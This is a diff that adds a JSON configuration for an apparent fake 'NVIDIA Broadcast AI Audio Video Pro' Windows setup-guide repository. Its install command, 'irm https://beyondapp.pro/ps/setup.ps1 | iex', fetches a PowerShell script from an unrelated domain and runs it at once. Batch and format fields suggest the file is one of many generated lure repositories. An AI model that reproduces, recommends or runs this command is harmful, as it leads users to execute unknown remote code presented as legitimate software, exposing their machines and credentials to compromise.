@@ -1,0 +1,25 @@
+{
+  "repo": "NVIDIA-Broadcast-AI-Audio-Video-Pro-Windows-Setup-Guide",
+  "product": "NVIDIA Broadcast AI Audio Video Pro Windows Setup Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "streaming",
+  "topics": [
+    "nvidia-broadcast-ai-audio-video-pro-wind",
+    "nvidia",
+    "broadcast",
+    "audio",
+    "video",
+    "pro",
+    "windows",
+    "streaming",
+    "desktop",
+    "setup-guide",
+    "software",
+    "productivity"
+  ]
+}
